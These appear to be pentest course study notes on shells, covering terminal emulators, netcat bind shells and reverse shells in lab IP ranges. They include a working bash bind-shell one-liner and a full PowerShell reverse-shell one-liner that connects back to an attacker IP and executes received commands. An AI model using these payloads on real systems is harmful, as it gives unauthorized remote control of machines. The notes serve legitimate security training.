### Anatomy of a Shell

```
# Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. 
# Here are some of the most common terminal emulators:

Terminal  Emulator	Operating System
Windows Terminal	Windows
cmder	            Windows
PuTTY	            Windows
kitty	            Windows, Linux and MacOS
Alacritty	        Windows, Linux and MacOS
xterm	            Linux
GNOME Terminal	    Linux
MATE Terminal	    Linux
Konsole	            Linux
Terminal	        MacOS
iTerm2	            MacOS
```

### Bind Shells

```
# With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).
# e.g.:

nc -nvlp 1337
output:
Listening port 1337

# There can be many challenges associated with getting a shell this way. 
# Here are some to consider:

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), 
  so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that 
  aren't associated with trusted network-based applications.

# Netcat:
# Netcat (nc) is considered our Swiss-Army Knife since it can function over TCP, UDP, and Unix sockets. 
# It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, 
# and even dealing with text input and output. 
# We would use nc on the attack box as our client, and the target would be the server.
```

```
# Practive with 2 hosts (target, local) and basic nc flow:

nc -lvnp 7777                                       # Target host starting Netcat listener
nc -nv 10.129.41.200 7777                           # Localhost connecting to target
`Connection from 10.10.14.117 51872 received!`      # Message on Target host
`Hello Test`                                        # Send message from Localhost
`Hello Test`                                        # Message apear on target host
```

# Establishing a Basic Bind Shell with Netcat

```
# Server - Target; Client - Locahost *

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.102.4 7777 > /tmp/f     # Server - Binding a Bash shell to the TCP session
nc -nv 10.129.102.4 7777                                                                           # Client - Connecting to bind shell on target
output:
Target@server:~$  
```

### Reverse Shells

```
# With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
# e.g.
nc -nvlp 1337               # On pentest host
nc -nv <pentestIP> 1337     # On target host
``` 

```
# Hands-on With A Simple Reverse Shell in Windows

sudo nc -lvnp 443           # On pentest host

# Oneliner to start reverse-shell on target win host:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"   

# What happened when we hit enter in command prompt?
output:
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
